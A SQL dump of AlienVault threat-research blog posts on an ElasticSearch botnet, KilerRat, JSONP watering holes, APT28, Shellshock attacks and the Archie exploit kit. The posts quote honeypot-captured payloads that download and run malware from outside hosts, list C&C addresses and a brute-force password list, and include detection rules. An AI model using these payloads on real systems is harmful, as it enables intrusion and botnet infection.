Calling HomeAfter execution, the bots request the IP of their current C&C master. Most bots we\'ve seen are using a DNS-name to get the IP, while we also observed some bots using included IPs, especially when no DNS-servers could be reached.\nBot communication - getting the IP of the current C&CAfter getting the current IP, some traffic from the bot could be observed, including an identifier and some information about the system the bot runs on, reporting \"On duty, Sire!\"-- some identifiers, send by bots to their masters-==Healer==- Linux 3.16.0-0.bpo.4-amd64 2.40\n-==ruirui ==- Linux 3.16.0-0.bpo.4-amd64 2.40\nLinux 3.16.0-0.bpo.4-amd64 root 4*2494MHZ 3688MB 0M 172.17.0.104\n\n\nBot-Communication, reporting into the botnetAfter reporting itself \"ready\" the bots pings the master every 5 seconds, waiting for commands and targets to attack, while transmitting its own status every 30 seconds.\nBot-Communication, keep-alive-pings and status-reportsOne variant (ssss) of those fBots occasionally requested and downloaded a file (amp.dat) from the server it initially got the bot from (http://111.74.239.61:8080/ntp.txt ); the latest version of this file consited of 14000+ IPs; it might be a list of servers that might be misused for amplification/reflection-attacks. We\'re not yet done checking all the IPs, but will deliver this analysis later in a a future blog post.Stage 3: Attack!When the C&C master promotes a new target, it\'s sent over to the client with a single package and the show begins:\nBot-Communication, getting target-IP and attack-startWhat we\'ve seen among all fBots: once the boss receives a target-IP it immediately fires just traffic (SYN-flood) onto a given port, either HTTP, MYSQL or otherrandom ports. The bots fire on max-speed, so any traffic originating from an infected server should easily be detected if the dc-operator enforces thresholds or monitors outgoing traffic. You definitely will see spikes.Some notes on infection-workflow and botnet-infrastructureA closer look on the operation of the whole botnet-infrastructure revealed an interesting workflow that functions as follows:Scanners crawl the internet, searching for vulnerable Elasticsearch-installations; once they find one they start to execute an exploitThe exploit downloads a bot from different server that hosts various bots and filesAfter download, the scanning-server executes the bot on vulnerable installationsIf the bot runs, it requests the IP for the C&C-master or uses a hardcoded IP and reports itself as ready, waiting for commandsUpon receiving the attack-command and the IP of a target, the attacks start\nThus we see a distributed infrastructure, controlled by the botmasters to create and operate botnets.In a follow-up blog we\'ll take a closer look on the botnet-infrastructure itself, and analyze it more deeply.The OTX pulses we created are:ElasticSearch-Botnet C&C-Master DNS-NamesElasticSearch-Botnet C&C-Master IPsElasticSearch Botnet - Botware Download URLsFootnotesit will be exploited, the question is not IF, but WHEN; scanners are scanning, 24/7ReferencesShodan: It\'s the Data, Stupid!A few things about Redis securityElasticsearch CVE-2015-5377What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This VulnerabilityMongoDB 2.2.3 - nativeHelper.apply Remote Code ExecutionMMD-0025-2014 - ITW Infection of ELF .IptabLex & .IptabLes China #DDoS bots malwareAkamai: Threat Advisory: XOR DDoSAppendixFull exploit-code, as seen by our honeypotsrequest: \"GET /_search?source={\"query\": {\"filtered\": {\"query\": {\"match_all\": {}}}}, \"script_fields\": {\"exp\": {\"script\": \"import java.util.*;import java.io.*;String str = \\\"\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\"wget -O /tmp/yf2 http://111.222.333.444/yf2\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\\\"\\r\\n\\\");}sb.toString();\"}}, \"size\": 1} HTTP/1.1\", host: \"my.boy.lollipop:9200\"Domains queried to get C&C - IPs-- fBots\n\nwww.zhimingge.in\n\nyy.zhimingge.in\n\nwww.3xdk.com\n\nfk.appledoesnt.com\n\nwww.3xdk.com-- iBots\n\n00120012.3322.orgList of servers that hosts various versions of bots (bot-providers)http://111.74.239.61:8080/ssss\nhttp://111.74.239.61:8080/ntp.txt → ntp-servers\nhttp://198.15.216.27:2015/xdg1\nhttp://111.74.239.61:8080/68089\nhttp://111.74.239.61:8080/04\nhttp://61.160.221.139:8000/xoxo\nhttp://222.186.30.247:8080/udp\nhttp://222.186.34.177:5656/vpcinull\nhttp://222.186.31.248:53/libvent\nhttp://114.215.149.148/yf2current C&C-IPs from the bots we executed and analyzed23.234.50.12\n61.160.194.62\n61.160.221.139\n103.105.144.172\n108.171.252.20\n113.105.144.172\n183.60.202.75\n222.186.15.92\n222.186.30.247\n222.186.34.177\n222.186.21.106\n222.186.190.233\n222.186.56.15Latest EntriesSets arriving - watching Scanners searching for Bittorrent clientsElasticZombie - Inside an ElasticSearch - BotnetSwell on the horizon - watching Scanners searching for Bittorrent clientsDDoS-Angriffe auf ukrainische und russische RechenzentrenGmail + CSP - a short analysisServer-Botnet with massive SSH-Brute-Force-Attacks (EN)Server-Botnetz mit massiven SSH-Brute-Force-Attacken (DE)SHA1-basierte SSL-Zertifikate und BrowserwarnungenThis is the END Also R.I.P. SSLv3suPHP might be exploited through ShellshockAbout the AuthorBio: Markus Manzke is a Security Analyst with a German partner of AlienVault\'s, 8ack.\nPlease follow 8ack on Twitter.', '8ackelasticsearchelasticzombie', '/blogs/labs-research/elasticzombie-botnet-exploiting-elasticsearch-vulnerabilities');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'KilerRat: Taking over where Njrat remote access trojan left off', 'Peter Ewane', 'November 9, 2015 ', 'Summary:This remote access trojan (RAT) has capabilities ranging from manipulating the registry to opening a reverse shell. From stealing credentials stored in browsers to accessing the victims webcam. Through the Command & Control (CnC) server software, the attacker has capabilities to create and configure the malware to spread utilizing physic devices, such as USB drives, but also to use the victim as a pivot point to gain more access laterally throughout the network.This remote access trojan could be classified as a variant of the well known njrat, as they share many similar features such as their display style, several abilities and a general template for communication methods . However, where njrat left off KilerRat has taken over. KilerRat is a very feature rich RAT with an active development force that is rapidly gaining in popularity amongst the middle eastern community and the world.Command and Control Server Features:Under the Control Tab: File Manager - Allows the attacker to delete, edit, rename, copy, paste, download, create new folders/files in addition to navigating the file system.Process Manager - Allows the attacker to list, suspend, resume, kill and kill & delete processes.Remote Desktop - Allows the attacker to start a Remote Desktop sessionRemote Cam - Allows the attacker to obtain access to the victim\'s system camera and display a live feedRemote Shell - Opens a reverse shell on the victim, which allows the attacker to input commands directly on the systemRegistry - Allows the attacker to manipulate the victim\'s system registry (create, edit, delete keys and values)Keylogger - Enables the key logging function on the victim, logs are automatically shipped back to the C&C server.Get Passwords - Allows the attacker to collect stored passwords in various browsers.Under the Proxy Tab:Victim Proxy - Allows the attacker to use the victim as a proxy for network traffic.Restart Proxy - Restarts the proxy on the selected victim.Send Msgbox - Allows the attacker to send a pop up text box to the victim.\nUnder the \'Run File’ Tab: From Link - Allows the attacker to provide a link to a file and have it executed on the victim’s system.From Disk - Allows the attacker to upload a file to the victim and have it executed on the victim’s system.Script - Allows the attacker to create script that is then executed on the victim’s system.Format System - Allows the attacker to format the victim’s system.\nUnder the ‘Website’ Tab:Open Website - Opens a website of the attackers choosing.Block Website - Blocks a website of the attackers choosing on the victim machine.DDOS Attack - Performs a DDOS attack on a victim of the attackers choosing.Open Chat - Opens a chat window on the victims machine.Spread in Hard Drive Under the ‘Computer\' Tab: Restart - Restarts the victim’s computer.Shutdown - Shutdown the victim’s computer.Under the ‘Server\' Tab:Update - Enables the attacker to update the malware on the victim via upload or a linkUninstall - Allows the attacker to uninstall the malware.Restart - Allows the attacker to restart the malware.Close - May allows the attacker to close the malwareDisconnect - Allows the attacker to sever the connection between them.Rename - Allows the attacker to rename the malware on the victim’s system.Open Folder - Opens the local folder on the attackers machine where data collected from the victim’s system is stored. Builder - Allows the attacker to build malware that will connect back to the serverNo-ip - Integrated with no-ip (A Dynamic DNS Service)Exe to convert jpg - Allows the attacker to convert an exe to a jpg, score, mp3, wav, txt mp4 or flv file. Builder Features:Host - Specifies Command and Control server.Port - Specifies Command and Control server listening port.Victim Name - Specifies prefix the victims appear with in the portal.Executable Name - Specifies malware name when it makes a copies itself.Directory - Specifies which directory to copy the malware to when executed, options include %TEMP%, %AppData%, %User Profile%, and %Program Data%.MsgBox After Run - Specifies what string to display in a text box after the malware runs successfully for the first time.USB Spread - Option to spread via USB devicesProtect Process - Option to cause the victim’s system to BSOD if the malware process is killed.Registry - Prevents the registry from being opened. (Buggy, sometimes you can still get accessS)Copy StartUp - Option to place the malware in the windows start upDelete Archives - Option to delete archivesSpread Hard DiskAnti Taskmgr - This option prevents the Task Manager from being opened on the victim’s computer.Scheduled Tasks - Add malware into scheduled task (may be buggy)Short Cut - Creates a short cut when the malware is installed MsgBox After Run - Option to display the MsgBox after installation.Network Communication:Like njrat, the infected victims of KilerRat when connecting to the C&C will send information about the victim system, malware version, open windows, etc. See example below:lv|Kiler|SGFjS2VkX0FFQTg0NUZD|Kiler|RICKBOBBYDOS-PC|Kiler|rickbobbydos|Kiler|2015-11-08|Kiler|USA|Kiler|Win 7 Ultimate SP1 x86|Kiler|Yes|Kiler|4.0.1|Kiler|..|Kiler|QzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhl|Kiler|[endof]DataDecoded InformationSGFjS2VkX0FFQTg0NUZDBase64 encoded data which decodes to HacKed_AEA845FC. HacKed being the specified victim name and AEA845FC being the Volume Serial Number of the victim system.RICKBOBBYDOS-PCVictim Computer NamerickbobbydosVictim User Name2015-11-08Date Modified attribute of the malware. This date will match the first time the file is created in the victim systemUSALocationWin 7 Ultimate SP1 x86Operating System InformationYesDoes the victim have a webcam4.0.1Malware VersionQzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlBase64 encoded data which decodes to \'C:\\Windows\\system32\\cmd.exe’. This data contains information about what windows are open when the malware executes.This information check-in is extremely similar to that of many of the njrat variants. With the exception being the data delimiters. Where njrat uses |\'|’| KilerRat uses |Kiler| instead. This small change makes many of the existing IDS signatures for njrat ineffective for KilerRat.inf|Kiler|SGFjS2VkX0FFQTg0NUZD|Kiler|172.16.176.128:6666|Kiler|AppData|Kiler|Trojan.exe|Kiler|Trojan[endof]This next C&C inf (Information) communication includes ‘Name’ we decode earlier, which includes the specified prefix and the Volume Serial Number of the victim system. It also includes the IP Address:Port of the C&C also which the location and name of the dropped malware, AppData and Trojan.exe. Once again we can see the delimiter used is |Kiler|.This next C&C communication is the request to open a reverse shell and a simple DIR command.From the server:rss[endof]From the victim after shell is opened:rs|Kiler|TWljcm9zb2Z0IFdpbmRvd3MgW1ZlcnNpb24gNi4xLjc2MDFd[endof] rs|Kiler|Q29weXJpZ2h0IChjKSAyMDA5IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi4gIEFsbCByaWdodHMgcmVzZXJ2ZWQu[endof]rs|Kiler|[endof]Which decodes to: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.From the server (base64 encoded):rs|Kiler|ZGly[endof]Which decodes to ‘dirFrom the victim:rs|Kiler|QzpcVXNlcnNccmlja2JvYmJ5ZG9zXERlc2t0b3A+ZGly[endof]Which decodes to \'C:\\Users\\rickbobbydos\\Desktop>dir\'From the victim:IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4=[endof]rs|Kiler|IFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIEFFQTgtNDVGQw==[endof]rs|Kiler|[endof]rs|Kiler|IERpcmVjdG9yeSBvZiBDOlxVc2Vyc1xyaWNrYm9iYnlkb3NcRGVza3RvcA==[endof]rs|Kiler|[endof]rs|Kiler|MTEvMDgvMjAxNSAgMDU6NDMgUE0gICAgPERJUj4gICAgICAgICAgLg==[endof]rs|Kiler|MTEvMDgvMjAxNSAgMDU6NDMgUE0gICAgPERJUj4gICAgICAgICAgLi4=[endof]rs|Kiler|MTEvMDgvMjAxNSAgMDU6MjkgUE0gICAgICAgICAgICA0OCw2NDAgUmlja0phbWVzLmV4ZQ==[endof]rs|Kiler|MTEvMDgvMjAxNSAgMDQ6NTQgUE0gICAgICAgICAgICAgICA3NjQgU3RhcnQgVG9yIEJyb3dzZXIubG5r[endof]rs|Kiler|MTEvMDgvMjAxNSAgMDQ6NTQgUE0gICAgPERJUj4gICAgICAgICAgVG9yIEJyb3dzZXI=[endof]rs|Kiler|ICAgICAgICAgICAgICAgMiBGaWxlKHMpICAgICAgICAgNDksNDA0IGJ5dGVz[endof]rs|Kiler|ICAgICAgICAgICAgICAgMyBEaXIocykgIDUyLDM2MSw3NTIsNTc2IGJ5dGVzIGZyZWU=Which is the base4 encoded dir command output.Detection:Even though this RAT is built upon the well known njrat, at the time of testing many antivirus tools had a difficult time detecting around the time of it\'s release. That being said, there are several ways one could detection a KilerRat infection. One way is utilizing YARA rules for njrat, as many of them trigger on KilerRat due to their shared codebase. Another method is utilizing an IDS with signatures such as this:alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"AV TROJAN njrat viariant (KilerRat v4.0.1) CnC Command (Remote Shell)\"; flow:from_server,established; content:\"rs|7c 4b 69 6c 65 72 7c|\"; fast_pattern; reference:md5,51409b4216065c530a94cd7a5687c0d6; classtype:trojan-activity; sid:4000010; rev:1;)Community:The identity of the person taking credit for the development and maintenance of KilerRat is shown in the ‘About’ page on the C&C control panel, which also confirms our suspicions that it is built upon njrat:The Facebook page listed in the above photo is quite active, with users commenting about bugs they\'ve encountered and requesting features they would like to see in addition to thanking the developer. The forum www.dev-point[.]com has an active community around this RAT along with a few others.', 'ratremote access trojankilerratnjrat', '/blogs/labs-research/kilerrat-taking-over-where-njrat-remote-access-trojan-left-off');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'Watering holes exploiting JSONP hijacking to track users in China', 'Jaime Blasco', 'June 11, 2015 ', 'By: Eddie Lee and Jaime Blasco Imagine if an authoritarian state had a tool to get private information about users visiting certain websites, including real names, mail addresses, sex, birthdays, phone numbers, etc. Imagine that even users that run TOR or VPN connections to bypass the tools that the authoritarian government uses to block and monitor these websites were exposed to this technique.In this blog post we are going to describe a series of watering hole attacks that have been targeting NGO, Uyghur and Islamic websites since at least October 2013, with the most recent attack discovered a few days ago. We want to thank Sumayah Alrwais, a PhD student in the system security lab at Indiana University, for discovering and notifying us through RSA Labs about this latest watering hole attack affecting the Chinese website of an international NGO.A Watering Hole is a technique where the attacker wants to target a particular group (company, industry, ethnic, etc). The attackers compromise websites used by the group and include malicious content that gets executed when users access the affected websites.Typically, attackers gain access to a victim’s system by including an iframe or JavaScript file from a malicious server to exploit a vulnerability in Internet Explorer, Java, or Flash. Some examples we have documented in the past are:Just another water hole campaign using an Internet Explorer 0day U.S. Department of Labor website hacked and redirecting to malicious codeIn other cases we have discovered Watering Holes where the attackers use reconnaissance techniques to extract information about software installed on a victim’s machine or even using a JavaScript keylogger to steal credentials:Attackers abusing Internet Explorer to enumerate software and detect security productsScanbox: A Reconnaissance Framework Used with Watering Hole AttacksIn addition to this, it is not the first time we have documented cyber espionage campaigns targeting China’s Uyghur minority:Cyber espionage campaign against the Uyghur community, targeting MacOSX systems New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT Latest Adobe PDF exploit used to target Uyghur and Tibetan activistsThe latest attack that we are describing is a novel technique that we haven’t seen before with watering hole attacks.  Let’s describe how it works:The attackers compromise several Chinese-language websites associated with NGOs, Uyghur communities and Islamic associations.The attackers modify the content of the website and include a JavaScript file from a malicious server.The JavaScript file exploits JSONP Hijacking vulnerabilities in more than 15 different major Chinese websites including the Top 5 portals used in China (see table below). Using JSONP requests, the attackers are able to bypass cross-domain policies and collect a user’s private information if the user is logged in to one of the affected services.The JavaScript code then sends the user’s private data collected to an attacker-controlled server.When we started to write this blog post we weren’t going to publish the list of affected services; however, after doing a bit of research, we found the same vulnerabilities have been public since 2013! Details of the vulnerabilities are mentioned in a Chinese security blog as well as several Chinese forums. To describe the severity of the issue, we are showing a list of Alexa ratings for the affected services and the personal data the attackers are able to steal: JSONP is a widely used technique to make cross-domain JavaScript requests that bypass the same-origin policy. However, bypassing the same-origin policy can lead to information leakage between different origins or domains. This is especially dangerous when JSONP contains user data. Since JSONP requests/responses bypass the same-origin policy, malicious sites can cause victims to make cross-domain JSONP requests and read the private data using the “script” tag.Let’s see an example from the malicious JavaScript found in one of the Watering Holes that we have analyzed.First the malicious JavaScript makes a JSONP request to one of the vulnerable services using the <script> tag. As you can see below, the script requests the renren_all callbackThe vulnerable site responds with the following content:When the browser receives the data, it calls the renren_all callback function that prepares the personal data including sex, birthday, real name and user ID to be sent to an attacker-controlled server.After all the JSONP requests have been made, the malicious JavaScript sends the data to an attacker-controlled server:Implications to privacy and attributionAll of the Watering Holes that we have observed are targeting Chinese users visiting Uyghur or Islam-related websites or NGOs sympathetic to freedom of speech. It looks like this campaign has been targeting a very small group of people, and since there is no financial gain on collecting most of the leaked personal data, we can say that whoever is behind these attacks is looking to reveal the identity of the users visiting certain websites. Another point is that some of the affected websites are hosted outside of China, and the Great Firewall likely blocks some of those sites. According to The China Story Project, one of the main categories of foreign websites that was blocked in China was regarding “Web pages belonging to organizations that campaign against the Communist Party or that promote Tibetan and Uyghur causes or independence for Taiwan, as well as sites belonging to the banned religious organization Falun Gong.”In general, the Great Firewall (GFW) is able to analyze and block traffic that is leaving China; however, this is not necessarily true when Chinese users run VPNs (Virtual Private Networks) or TOR. In these cases, the GFW doesn’t have full visibility into the traffic that goes through VPNs or TOR. When plaintext traffic comes out of VPNs or TOR endpoints, the GFW doesn’t know the real IP address of the user that is visiting a specific website.Now imagine that the Chinese government wants to know the real identities of individuals visiting certain websites that are sympathetic to certain causes, people who are exiled, or specific people living abroad even when they use TOR or VPNs. In the scenario we have described, this is a reality and has been happening since 2013. Even if the only data the attackers can obtain is a user ID for a specific website, this information can be used to pinpoint targets for espionage within the GFW. RecommendationsFirst of all, the list of affected sites (Baidu, Taobao, etc.) should fix the JSONP Hijacking vulnerabilities. There are several ways to do this:- Include a random value in all the JSONP requests (this also works to prevent CSRF attacks)- Use CORS instead of JSONP- Don’t use cookies (e.g. session identifiers) to customize JSONP responses- Don’t include private/user data in JSONP responsesThe recommendation for users is be vigilant and follow best practices when browsing the Web, especially if you live in an authoritarian country or you are worried about being tracked. For example, do not browse sensitive websites after logging into another website - even in a different tab or window.It is really important to understand the differences between anonymity and privacy. For instance, if you are using TOR or a VPN service that encrypts your communications, it is going to give you a certain level of privacy, but your anonymity is still at risk. Anonymity is the idea of being “non-identifiable” or un-trackable, but as we have described in this blog post it is hard to remain anonymous if you are using services where you have revealed personal information and you browse other sites that can exploit vulnerabilities to access your personal information.[Update: 06/15/2015]We would like to thank you Citizen Labs for helping us with victim notification. On the other hand we want to point out that every TOR user should be using the TOR browser that is more suitable to browse the web to prevent these kind of attacks and other privacy related issues.', 'chinaprivacytorwatering hole attacksmalicious javascriptwatering holescensorship', '/blogs/labs-research/watering-holes-exploiting-jsonp-hijacking-to-track-users-in-china');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, 'From Russia with love: Sofacy/Sednit/APT28 is in town', 'Jaime Blasco', 'October 28, 2014 ', 'Yesterday, another cyber espionage group with Russian roots made it to the New York Times headlines again courtesy of FireEye and a new report they published.FireEye did a pretty good job on attribution and giving some technical indicators; however, they neglected to reference previous work on this threat actor from companies like PWC, TrendMicro, ESET and others.We have been tracking this threat actor (Sofacy) for a few years when it first appeared on our radar in one of the CVE-2012-0158/CVE-2010-3333 clusters. Based on the lure content contained in the malicious documents as well as the phishing campaigns we have seen in the past, this group tends to target NATO, Eastern Europe government and military institutions and defense contractors. We have seen lures related to Ukraine, Chechnya and Georgia that indicates one of the group\'s objectives is gathering geopolitical intelligence.The techniques used by this group have evolved over the years.- SpearphishingMost of the Spearphishing campaigns launched by this group involve a malicious Word document exploiting one of the following vulnerabilities:CVE-2010-3333CVE-2012-0158CVE-2014-1761As described by FireEye and others, this group uses different payloads including a downloader and several second-stage backdoors and implants.We cover these tools using the following rules with USM:System Compromise, Targeted Malware, OLDBAIT - SofacySystem Compromise, Targeted Malware, Chopstick - SofacySystem Compromise, Targeted Malware, Coreshell - SofacySystem Compromise, C&C Communication, Sofacy Activity- Web compromisesThe group has been seen infecting websites and redirecting visitors to a custom exploit kit being able to take advantage of the following vulnerabilities affecting Internet Explorer:CVE-2013-1347CVE-2013-3897CVE-2014-1776The following rule detects activity related to this exploit kit:Exploitation & Installation, Malicious website - Exploit Kit, Sednit EK- Phishing campaignsThis actor uses phishing campaigns to redirect victims to Outlook Web Access (OWA) portals designed to impersonate the legitimate OWA site of the victim\'s company. This technique is used to compromise credentials and access mailboxes and other services within the company.Inspecting the content of the malicious redirect we can alert on this activity using the following rule:Delivery & Attack, Malicious website, Sofacy PhishingReferences:[1] http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing-.pdf\n[2] http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-the-red-in-sednit/\n[3] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf\n[4] http://www.welivesecurity.com/2014/10/08/sednit-espionage-group-now-using-custom-exploit-kit/\n[5] http://malware.prevenity.com/2014/08/malware-info.html\n[6] http://www.fireeye.com/resources/pdfs/apt28.pdf', 'malwareaptinternet explorercve-2012-0158exploitcve-2013-1347spearphishingphishingweb compromisesapt28sofacysednitcve-2014-1761cve-2014-1776cve-2010-3333cve-2013-3897', '/blogs/labs-research/from-russia-with-love-sofacy-sednit-apt28-is-in-town');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (38, 'Attackers exploiting Shellshock (CVE-2014-6271) in the wild', 'Jaime Blasco', 'September 25, 2014 ', 'Yesterday, a new vulnerability affecting Bash (CVE-2014-6271) was published. The new vulnerability allows attackers to execute arbitrary commands formatting an environmental variable using a specific format. It affects Bash (the Bourne Again SHell), the default command shell for Linux and other UNIX flavors inlcuding Mac OS X. The vulnerability is critical since it can be exposed on web servers that use mod_cgi or code that calls the bash shell. Other systems that are probably affected are network services and daemons that use shell scripts with environmental variables.Yesterday we began running a new module in our honeypots, waiting for attackers to exploit this vulnerability.We have had several hits in the last 24 hours. Most of them are systems trying to detect if the system is vulnerable and they simple send a ping command back to the attacker’s machine:209.126.230.72 - - [25/Sep/2014 05:14:12] \"GET / HTTP/1.0\" 200 -\nreferer, () { :; }; ping -c 11 209.126.230.74\n122.226.223.69 - - [25/Sep/2014 06:56:03] \"GET http://www.k2proxy.com//hello.html HTTP/1.1\" 200 -\n89.207.135.125 - - [25/Sep/2014 07:23:43] \"GET /cgi-sys/defaultwebpage.cgi HTTP/1.0\" 200\nuser-agent, () { :;}; /bin/ping -c 1 198.101.206.138Apart from those hits we have found two attackers that are using the vulnerability to install two different pieces of malware on the victims.The first one downloads and executes an ELF binary:Cookie, ().{.:;.};.wget /tmp/besh http://162.253.66[.]76/nginx; chmod.777 /tmp/besh; /tmp/besh;\nMD5 (nginx) = 5924bcc045bb7039f55c6ce29234e29a\nnginx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, strippedIf we take a look at the binary, we can see it tries to get information about the system such as number of CPUs, network configuration, etc.It also contains the following code:/bin/busybox;echo -e \'\\147\\141\\171\\146\\147\\164\'It is basically used to fingerprint honeypots as described in this InfoSec Handlers Diary Blog article The sample opens a connection to a C&C server on 89.238.150.154 port 5. It supports the following commands:PING\nGETLOCALIP\nSCANNER\nHOLD\nJUNK (DoS Flood)\nUDP (DoS Flood)\nTCP (DoS Flood)\nKILLATTK\nLOLNOGTFOYou can find a list of username/password hardcoded in the binary:root\nadmin\nuser\nlogin\nguest\ntoor\nchangeme\n1234\n12345\n123456\ndefault\npass\npasswordThis list is probably used to perform brute force attacks.There is another sample downloaded from the same server (apache):MD5 (apache (1)) = 371b8b20d4dd207f7b3f61bb30a7cb22It contains the same code but a different C&C server, 162.253.66.76 port 53You can use the following Yara rule to detect the Linux bot:rule bashWorm {\n       strings:\n               $a = \"JUNK Flooding %s:%d for %d seconds.\"\n               $a2 = \"UDP Flooding %s for %d seconds.\"\n               $a3 = \"UDP Flooding %s:%d for %d seconds.\"\n               $a4 = \"TCP Flooding %s for %d seconds.\"\n               $a5 = \"KILLATTK\"\n               $a6 = \"REPORT %s:%s:\"\n               $a7 = \"PING\"\n               $a8 = \"PONG!\"\n               $a9 = \"GETLOCALIP\"\n       condition:\n               all of them\n}\n\nPerl botApart from that piece of malware, our honeypot received another interesting attack a few hours ago:User-Agent, \"() { :;}; /bin/bash -c \\\"cd /tmp;curl -O http://213.5.67.223/jur ; perl /tmp/jur;rm -rf /tmp/jur\\”The file is a PERL script with MD5 0763b8c00d6862d2d0f8f980de065857.It seems it is a repurposed IRC bot that connects to an IRC server and waits for commands.The perl script starts the following process:root     17720 81.1  0.0  24848  4140 ?        R    17:52   0:04 /usr/sbin/atdAs soon as the infected machine connects to the IRC server (185.31.209.84) on port 443. it joins the following channel on the IRC server:  JOIN #new ddosit.\n3810-  51 |PHP|3551 :There are 1 users and 715 invisible on 1 servers..It seems there are 715 users (probably victims) connected to the server right now.As soon as new victims join the server, the attackers are executing the command \"uname  -a\" to determine the operating system that is running on the victim as well as \"id\" to check the current username.Since our honeypot joined the server, more than 20 new victims have become part of the botnet. Some examples are: Linux xxx.321webhosting.biz 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:22:04 EDT 2011 x86_64 x86_64 x86_64 GNU/Linux..\n Linux xxx.mydreamads.com 2.6.18-308.1.1.el5xen #1 SMP Wed Mar 7 05:38:01 EST 2012 i686 i686 i386 GNU/Linux..\n Darwin cisco 13.3.0 Darwin Kernel Version 13.3.0: Tue Jun  3 21:27:35 PDT 2014; root:xnu-2422.110.17~1/RELEASE_X86_64 x86_64..\n Linux xxx.servlinux.net 2.6.32-431.20.3.el6.x86_64 #1 SMP Thu Jun 19 21:14:45 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux..\n Linux xxx.hostforleads.com 2.6.32-279.14.1.el6.i686 #1 SMP Tue Nov 6 21:05:14 UTC 2012 i686 i686 i386 GNU/Linux..\n Linux xxx.tekburst.com 3.2.62-74.art.x86_64 #1 SMP Fri Sep 12 09:46:02 EDT 2014 x86_64 x86_64 x86_64 GNU/Linux..\n Linux Mitel5kps 2.6.36 #1 Thu Aug 11 00:23:48 GMT 2011 i686 GNU/Linux..\n Linux Mitel5000 2.6.22.19-4.03.0-mitel_acp5000 #2 Fri Mar 28 05:00:24 MST 2014 armv6l GNU/Linux..\n Darwin Discovery.local 13.4.0 Darwin Kernel Version 13.4.0: Sun Aug 17 19:50:11 PDT 2014; root:xnu-2422.115.4~1/RELEASE_X86_64 x86_64..\n PHP 5.4.30 (cli) (built: Jul 29 2014 23:43:29) Zend Engine v2.4.0, Copyright (c) 1998-2014\n Linux antares 3.13.0-35-generic #62-Ubuntu SMP Fri Aug 15 01:58:01 UTC 2014 i686 athlon i686 GNU/Linux..\n Linux cs94.XXX.com 2.6.9-89.0.16.plus.c4smp #1 SMP Tue Nov 3 18:15:39 EST 2009 i686 i686 i386 GNU/Linux..The attackers appear to be Romanian speakers as we can see in the following messages that we have seen in the IRC server:  :[email protected] PRIVMSG #new :EU MAI STIU FRATE ?\n  :[email protected] PRIVMSG #new :ma duc pana jos..\n  :[email protected] PRIVMSG #new :ca se inverzeste ecranu..We will be updating the blog post as we discover more information about these threats.Thanks to Eduardo de la Arada from the labs team for assisting on the analysis of the Linux bot.', 'botnetexploitircbashcve-2014-6721', '/blogs/labs-research/attackers-exploiting-shell-shock-cve-2014-6271-in-the-wild');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (39, 'Archie: Just another Exploit kit', 'Jaime Blasco', 'September 15, 2014 ', 'We have previously described how Exploit Kits are some of the favorite techniques used by cybercriminals to install malicious software on victims\' systems.The number of Exploit Kits available has experienced exponential growth in the last few years. Since Blackhole’s author was arrested in 2013, the number of Exploit Kits has increased - including Neutrino, Magnitude, Nuclear, Rig and Angler. In this blog post we discuss Archie, an Exploit Kit that was first discovered by William Metcalf.Archie is a really basic Exploit Kit that uses different exploit modules copied from the Metasploit Framework. When the victim lands on the main page, Archie uses the PluginDetect Javascript library to extract information about Flash, Silverlight and Acrobat Reader versions and the information is sent to the server.It also uses the following trick to check whether or not the system is running a 64-bit version of Internet Explorer. We documented this trick in previous blog posts.Depending on the Silverlight, Internet Explorer and Flash versions, it will try to load a different exploit module including:FilenameCVEAffected SoftwareMD5flashlow.swfCVE-2014-0497Flash4f3f7b896ab69ec2c082709220000b38flashhigh.swfCVE-2014-0515Flash18e0629ba830f0894268aa1dca92ea78silverapp1.xapCVE-2013-0074SilverLightf1759371fe6c7f46ca3c82edd456eca2iebasic.htmlCVE-2013-2551Internet Explorere9fbd007f6fa2f188c090f535da7ca4aArchie contains shellcode in different formats that is sent to the different exploit modules generated by Metasploit when it loads them.If we disassemble the shellcode we can see it is a basic download and execute payload.4010bb     LoadLibraryA(urlmon)\n401089     VirtualAlloc(base=0 , sz=400) = 60000\n4010ce     GetTempPath(len=104, buf=60000) = 14\n4010a7     URLDownloadToFile(http://IPADDRESS:PORT/dd, C:\\users\\user\\Temp\\e.dll)\n401108     LoadLibraryA(C:\\users\\user\\Temp\\e.dll)\n401114     Sleep(0x3a98)The shellcode downloads a DLL from the webserver, writes it in \\Users\\[Current_user]\\Temp\\e.dll and then loads it.The IP address where the Archie Exploit Kit is hosted, and the piece of malware delivered, is also being used for click fraud operations. It is related to this research published by Kimberly on the click fraud bot http://stopmalvertising.com/malware-reports/anatomy-of-a-net-click-fraud-bot.html [no longer available].Following is the list of hashes that we have found connecting to the same 